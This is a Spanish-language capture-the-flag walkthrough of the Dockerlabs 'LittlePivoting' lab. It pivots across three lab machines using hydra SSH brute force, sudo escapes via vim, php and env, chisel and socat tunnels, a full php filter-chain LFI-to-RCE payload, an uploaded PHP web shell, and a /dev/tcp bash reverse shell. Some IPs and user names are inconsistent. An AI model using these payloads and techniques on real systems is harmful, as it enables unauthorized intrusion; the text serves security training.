
# Writeup Template: Maquina `[ LittlePivoting ]`

- Tags: #LittlePivoting #Chisel #Socat #ProxyGobuster
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina LittlePivoting](https://mega.nz/file/Ve8zRBaZ#CKDTDbTkrZmLI7CeVOs_lGvg34c90XENg6uyGqFcWUE) Para este laboratorio tenemos que realizar pivoting con dieferentes maquina:

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
sudo bash auto_deploy.sh trust.tar inclusion.tar upload.tar
```

---
## Fase de Reconocimiento
### Direccion IP del Target
Nuestra direccion IP objetivo primero es:
```bash
10.10.10.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 10.10.10.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 10.10.10.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 10.10.10.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 10.10.10.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((DebianMantic))
```
---

## Enumeracion de [Servicio Web Principal] `Objetivo 1`
direccion **URL** del servicio:
```bash
http://10.10.10.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://10.10.10.2/ # NO reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 10.10.10.2
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://10.10.10.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://10.10.10.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,java,py
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
```

Tenemos este archivo php que si ingresamos a el tenemos lo siguiente:
```bash
http://10.10.10.2/secret.php
```

Revisamos si contenia parametros pero no obtuvimos ninguno:
```bash
wfuzz -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u "http://10.10.10.2/secret.php?FUZZ=../../../../etc/passwd" --hl=39
```

---
## Explotacion de Vulnerabilidades
Usaremos **chisel** para el enrutamiento

### Ejecucion del Ataque
Realizamos un ataque de fuerza bruta en el objetivo ya que la web nos da una pista de un posible usuario **mario**
```bash
# Comandos para explotación
hydra -l mario -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://172.17.0.2
```

Obtuvimos las credenciales de acceso **ssh**:
```bash
[22][ssh] host: 10.10.10.2   login: mario   password: chocolate
```
### Intrusion
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 10.10.10.2 && ssh mario@10.10.10.2 # ( chocolate )
```

---

## Escalada de Privilegios & Pivoting

###### Usuario `[ mario ]`:
Listando los permisos para este usuario:
```bash
sudo -l

User mario may run the following commands on 905fa8885cbb:
    (ALL) /usr/bin/vim
```

Explotamos el privilegio
```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/vim -c ':!/bin/bash'
```

Ahora estamos como usuario **root**
```bash
root@905fa8885cbb:/home/mario# whoami
root
```

Ahora para este usuario tenemos esta subred a la cual desde mi maquina atacante no podemos realizar conexion:
```bash
hostname -I
10.10.10.2 
20.20.20.2 # Maquina objetivo 
```

##### Maquina objetivo `20.20.20.3`
Sabiendo que tenemos conectivado con la maquina:
```bash
ping -c 1 10.10.10.2
```

Pero no con la maquina que existe en la subred:
```bash
ping -c 1 20.20.20.3

PING 20.20.20.3 (20.20.20.3) 56(84) bytes of data.
--- 20.20.20.3 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```

#### Preparar servidor en atacante (10.10.10.1)
En este caso no tentemos **ping** pero contamos con los comandos de **curl** y **wget** asi que ahora tendremos que montar un servidor con **python** desde nuestra maquina atacante, Para tranferir el **chisel** a la maquina victima:
```bash
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz

gzip -d chisel_* && chmod +x chisel_*
```

Iniciamos el servidor que estara en escucha por el puerto **8000** en nuestra maquina atacante
```bash
./chisel_1.9.1_linux_amd64 server -p 8000 --reverse
2025/07/01 21:57:17 server: Reverse tunnelling enabled
2025/07/01 21:57:17 server: Fingerprint ZcIy8S+OfYEf6uL3pQorKe6Gehh/E0Cv1oRij1cLCDo=
2025/07/01 21:57:17 server: Listening on http://0.0.0.0:8000
```

#### Enviar chisel al objetivo (10.10.10.2)
Ahora montamos le servidor para que este disponible **chisel** desde nuestra maquina atacante:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

Como **root** en la maquina victima en el directorio temporal realizaremos la peticion para descargar la herramienta **chisel**:
```bash
wget http://10.10.10.1/chisel_1.9.1_linux_amd64

chmod +x chisel_1.9.1_linux_amd64
```

#### Crear túnel inverso (SOCKS5) maquina victima
```bash
./chisel_1.9.1_linux_amd64 client 10.10.10.1:8000 R:socks
2025/07/01 22:02:51 client: Connecting to ws://10.10.10.1:8000
2025/07/01 22:02:51 client: Connected (Latency 279.657µs)
```

#### Configurar proxy en atacante
1. Verifica que el proxy SOCKS5 escucha en `127.0.0.1:1080` (automático con chisel)
2. Configura herramientas para usar el proxy como root:
```bash
# Usando proxychains (edita /etc/proxychains4.conf):
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
```

Ahora desde el navegador **firefox** en **(settings > ServidorSocks )** cargamos la direccion IP y el puerto
```bash
127.0.0.1 1080
```

Seleccionamos **SOCKSv5** y guardamos la configuracion: Ahora si ingresamos desde una nueva ventana en **firefox** a la siguiente direccion ip
```bash
http://20.20.20.3/
```
##### Maquina objetivo `30.30.30.3`
Ahora tenemos este servicio http
```bash
http://20.20.20.3/
```

Ahora que ya tenemos conexion con la maquina ahora lanzamos un escaneo para determinar si existen directorios
```bash
proxychains dirb http://20.20.20.3/ 2>/dev/null
```

Tenemso el siguiente directorios:
```bash
---- Scanning URL: http://20.20.20.3/ ----
+ http://20.20.20.3/index.html (CODE:200|SIZE:10701)
+ http://20.20.20.3/server-status (CODE:403|SIZE:275)
==> DIRECTORY: http://20.20.20.3/shop/                                                                                                                                                                                                                                       
---- Entering directory: http://20.20.20.3/shop/ ----
+ http://20.20.20.3/shop/index.php (CODE:200|SIZE:1112) 
```

Ingresamos a la siguiente url
```bash
http://20.20.20.3/shop/index.php
```

Tenemos una web para venta de teclados que contiene el siguiente error:
```bash
"Error de Sistema: ($_GET['archivo']");
```

Ahora sabemos que esta realizando una llamada al parametro **archivo** asi que realizaremos fuzzing para ver si podemos derivarlo a un **LFI**
```bash
proxychains wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://20.20.20.3/shop/index.php?archivo=FUZZ" --hl=44
```

Tenemos estas formas posibles de derivar un **LFI**
```bash
"../../../../etc/passwd"            
"../../../../../../../../etc/passwd"
"../../../../../etc/passwd"         
"../../../../../../etc/passwd"      
```

Ejecutamos el ataque:
```bash
20.20.20.3/shop/index.php?archivo=../../../../../etc/passwd
```

Tenemos el contenido del archivo **passwd**
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
seller:x:1000:1000:seller,,,:/home/seller:/bin/bash
manchi:x:1001:1001:manchi,,,:/home/manchi:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
```

Ahora sabemos que tenemos dos usuario en el sistema objetivo:
```bash
seller:x:1000:1000:seller,,,:/home/seller:/bin/bash
manchi:x:1001:1001:manchi,,,:/home/manchi:/bin/bash
```

Ahora tendremos que derivar el **LFI** a un **RCE** con la herramienta **phpFilterChainGenerator**
```bash
php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'
```

Ahora nos genera este payloada:
```bash
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Pero no ha funcionando asi que realizaremos fuerza bruta a los usuario que hemos encontrado y primero empezaremos con **manchi**
```bash
proxychains hydra -l manchi -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://20.20.20.3 2>/dev/null
```

Tenemos un usuario valido:
```bash
[DATA] attacking ssh://20.20.20.3:22/
[22][ssh] host: 20.20.20.3   login: manchi   password: lovely
```

Ahora nos conectaremos atraves de ssh con este usuario:
```bash
proxychains ssh manchi@20.20.20.3 # ( lovely )
```
###### Usuario `[ machi ]`:
Con la enumeracion del sistema no se encontraron fallas de segurida, asi que realizaremos fuerza bruta con una herramienta:
Primero nos copiamos la herramieta a nuestra carpteta:
```bash
sudo cp /usr/bin/Sudo_BruteForce/Linux-Su-Force.sh .
```

Ahora por **ssh** pasando por el **proxy** realizaraemos la copia
```bash
proxychains scp Linux-Su-Force.sh manchi@20.20.20.3:/home/manchi/Linux-Su-Force.sh # ( lovely )
```

Ahora si listamos desde la maquina victima tenemos ya la herramienta:
```bash
 ls -la
total 24
-rwxr-xr-x 1 manchi manchi 1600 Jul  2 00:05 Linux-Su-Force.sh
```

Ahora tambien usaremos el diccionario **rockyou** para este ataque asi que lo transferfimos a la maquina victima:
```bash
cp /usr/share/wordlists/rockyou.txt .
```

Transferimos por **ssh**
```bash
proxychains scp rockyou.txt manchi@20.20.20.3:/home/manchi/rockyou.txt # ( lovely )
```

Una ves transferidas las herramientas lo ejecutamos en la maquina victima de la siguiente manera:
```bash
ls
Linux-Su-Force.sh  rockyou.txt**
```

Ejecucion:
```bash
bash Linux-Su-Force.sh seller rockyou.txt 
```

Tenemos la contrasena de el usuario **seller**
```bash
Contraseña encontrada para el usuario seller: qwerty
```

Ahora migramos de usuario:
```bash
su seller # ( qwerty )
```

###### Usuario `[ machi ]`:
Listando los permisos para este usuario:
```bash
sudo -l

User seller may run the following commands on 96e650d24ad5:
    (ALL) NOPASSWD: /usr/bin/php
```

Explotamos el binario:
```bash
sudo -u root /usr/bin/php -r 'system("/bin/bash");'
root@96e650d24ad5:/home/seller#
```

- **Host comprometido:** `20.20.20.3` (también tiene `30.30.30.2`)
- **Nuevo objetivo:** `30.30.30.3`
- **Redes:**
    - Red 1: `20.20.20.0/24` (ya accesible)
    - Red 2: `30.30.30.0/24` (nuevo objetivo)
Ahoro verificamos que en nuestra maquina atacante verificamos si seguimos en escucha:
```bash
netstat -tulpn | grep 8000
```

Como ya tenemos **chisel** activo usaremos el mismo **proxy** que ya teniamos configurado
Desde la maquina victma 1 la primera que vulneramos montaremos un servidor con python para transeferirla la herrramienta **chisel_1.9.1_linux_amd64** a la maquina victima 2
```bash
python3 -m http.server 5000
Serving HTTP on 0.0.0.0 port 5000 (http://0.0.0.0:5000/) ..
```

Ahora desde la maquina victima 2 realizaremos la peticion para transferir la herramienta **chisel**
```bash
wget http://20.20.20.2:5000/chisel_1.9.1_linux_amd64
```

Tenemos la herramienta:
```bash
--2025-07-02 00:42:32--  http://20.20.20.2:5000/chisel_1.9.1_linux_amd64
Connecting to 20.20.20.2:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8654848 (8.3M) [application/octet-stream]
Saving to: 'chisel_1.9.1_linux_amd64'

chisel_1.9.1_linux_amd64 100%[===========>]   8.25M  --.-KB/s    in 0.03s   

2025-07-02 00:42:32 (308 MB/s) - 'chisel_1.9.1_linux_amd64' saved [8654848/8654848]
```

Ahora le damos permisos de ejecucion:
```bash
chmod +x chisel_1.9.1_linux_amd64
```

**Nota** Ahora es cuando usaremos la herremienta [Socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) de este repositorio oficial
```bash
wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
```

Ahora montamos un servidor python3 desde nuestra maquina atacante para que este disponible **socat**
```bash
python3 -m http.server 80
```

Realizamos la peticion desde la maquina victima 1 para descargar socat:
```bash
proxychains scp socat mario@20.20.20.2:/home/mario/socat
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  20.20.20.3:22  ...  OK
manchi@20.20.20.2's password: 
socat  
```

Ahora ya tenemos **socat** en la maquina victima 1
```bash
chmod +x socat 
-rwxr-xr-x 1 mario mario  375176 Jul  2 01:05 socat
```

Ahora que ya esta en modo escucha desde la maquina dos donde con el usuario **seller** escalamos a **root** usaremos **chisel** para crear un tunel como en la maquina anterior
Ya teniendo **chisel** en la maquina victima 2
```bash
chisel_1.9.1_linux_amd64

chmod +x chisel_1.9.1_linux_amd64 
```

```bash
wget http://20.20.20.2:5000/chisel_1.9.1_linux_amd64
--2025-07-02 01:40:18--  http://20.20.20.2:5000/chisel_1.9.1_linux_amd64
Connecting to 20.20.20.2:5000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8654848 (8.3M) [application/octet-stream]
Saving to: 'chisel_1.9.1_linux_amd64'

chisel_1.9.1_linux_amd64                                            100%[========================>]   8.25M  --.-KB/s    in 0.03s   

2025-07-02 01:40:18 (282 MB/s) - 'chisel_1.9.1_linux_amd64' saved [8654848/8654848]
```

Ahora desde esta maquina 1 victima creamos el tunel para redirigir todo el trafico por el puero que nosostros decidamos **8000** en el que estamos escucha desde nuestra maquina atacante:
```bash
./socat TCP-LISTEN:8888,fork TCP:10.10.10.1:8000
```

Ahora desde la maquina victima 2
```bash
hostname -I
20.20.20.3 30.30.30.2 
```

Como ya tiene **chisel** realizaremos un reenvio de puertos apuntaremos a la maquina victima 2
```bash
chmod +x chisel_1.9.1_linux_amd64
```

Importante referncial un nuevo puerto **4444** ya que el primero que esta en escucha y esta en uso
```bash
./chisel_1.9.1_linux_amd64 client 20.20.20.2:8888 R:4444:socks
```

Ahora desde nuestra maquina recibimos nuevo tunel:
```bash
./chisel_1.9.1_linux_amd64 server -p 8000 --reverse

2025/07/02 01:27:48 server: Listening on http://0.0.0.0:8000
2025/07/02 01:28:10 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2025/07/02 02:02:06 server: session#9: tun: proxy#R:127.0.0.1:4444=>socks: Listening
```

**Nota** Ahora para que tengamos conexion con la maquina objetvio: **30.30.30.3** necesitamos configurar nuestro archivo de configuracion de **proxy**:
```bash
nvim /etc/proxychains4.conf
```

```bash
dynamic_chain # Aqui habilitamos el dynamic
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
#strict_chain # Aqui comentamos esta para que no funciones
```

Ahora mas abajo del archivo agregamos un nuevo **sock**
```bash
R:127.0.0.1:4444=>socks: Listening # Este esta en eschucah desde nuestro servidor atacante:
```

Quedando asi:
```bash
socks5 127.0.0.1 4444
socks5 127.0.0.1 1080
```

Ahora tendremos que cargar este **proxy** en el navegador firefox para que puedamos acceder al recurso:
**( settings > configuracion manual de proxy > servidorScok > Sockv5 )**
```bash
127.0.0.1 4444 # puerto del segundo tunel
```

Ahora si que podemos ver el recurso:
```bash
http://30.30.30.3/
```

Tenemos un servicio web que nos permite subir un archivo, que si no valida el tipo de archivo nos aprovecharemos de esto para ganar acceso al objetivo medianet un archivo maliciso:
```bash
nvim cmd.php
```

Esto nos permite realizar una llamada a nivel de sistema para ejecutar un comando:
```php
<?php
  system($_GET["cmd"]);
?>
```

Ahora intentamos subir el archivo **php** en caso de que no lo permita realizaremos un ataque de extensiones:
```bash
The file cmd.php has been uploaded.
```

Vemos que se logro cargar ahora tenemos que averiguar donde es que se almacena asi que con **proxy** relizaremos fuzzing para encontrar el posible directorio donde se almaceno nuestro archivo malicioso
Ahora fuzzeamos por directorios
```bash
proxychains dirb  http://30.30.30.3/ 2>/dev/null
```

Ahora fuzzeamos con un proxy intermedio y gobuster
```bash
gobuster dir -u http://30.30.30.3/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --proxy socks5://127.0.0.1:4444 --add-slash
```

Y tenemos el posible directorio donde se suben los archivos:
```bash
/uploads/             (Status: 200) [Size: 936]
```

Si ingresamos a esta ruta tenemos nuestro archivo malicioso:
```bash
http://30.30.30.3/uploads/cmd.php
```

Ahora intentamos ejecutar comandos:
```bash
http://30.30.30.3/uploads/cmd.php?cmd=whoami
```

Ahora ganamos acceso a la maquina victima3
```bash
http://30.30.30.3/uploads/cmd.php?cmd=whoami
```

output del comando:
```bash
www-data
```

Ahora para ganar acceso a la maquina victima 3 tendremos que crear un nuevo tunel en la maquina victima 1
Asi que abrimos una nueva sesion con en la maquina victima 1
```bash
ssh-keygen -R 10.10.10.2 && ssh mario@10.10.10.2
```

Una ves conectados de nuevo volvemos a ganar acceso como **root**
```bash
sudo /usr/bin/vim
:!/bin/bash
```

Ahora volvemos a redirigir el trafico a la maquina atacante con **socat** para indicar que todo lo que llegue a esta maquina victima 1 lo rediriga a nuestro puerto de atacante **443**: 
```bash
# Mario
./socat TCP-LISTEN:443,fork TCP:10.10.10.1:443
```

Una ves que indicamos que todo el trafico sea enviado a nuestra maquina atacante por el puerto **443**
Ahora desde la maquina victima3 que ya tenemos ejecucion de comandos, enviaremos la revershell a la maquina victima1 por el puerto 443 y a su ves **socat** manda esa revershell a nuestra maquina atacante:
**Nota** la revershell la tendremos que enviar a esta interfaz **20.20.20.2** que es de la maquna victima 2 para que logre tener acceso y especificamos el puerto 443 que es por el cual escucha **socat**
Nos ponemos en escucha en nuestra maquina atacante:
```bash
nc -nlvp 443
```

Ahora tambien en la maquina victima dos con el usaurio **manchi** tenemos que crear el tunel con **socat**.
```bash
./socat TCP-LISTEN:443,fork TCP:20.20.20.2:443
```

Una ves conectadas la maquina victima3 que es del usuario machi
```bash
20.20.20.3 30.30.30.2
```

Con la del usuario mario que es la maquina victima2
```bash
20.20.20.2
```

Una ves que estan tunelizadas ya deveriamos de ganar acceso a la maquina victama3 que es el objetivo:
Como ya estamos en escucha desde nuestra maquina atacante desde el puerto 443 solo lanzamos la **revershell** desde la web
```bash
http://30.30.30.3/uploads/cmd.php?cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E/dev/tcp/30.30.30.2/443%20%3C%261%27
```

Ahora tenemos que escalar privielgios:
```bash
www-data@a22ec6d61c39:/var/www/html/uploads$
```

Si listamos los permisos de este usuario:
```bash
sudo -l
(root) NOPASSWD: /usr/bin/env
```

Se ve asi porque mi tty esta bugueada:
```bash
sudo -u root /usr/bin/env /bin/sh - 
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@a22ec6d61c39:/var/www/html/uploads$
root
```

---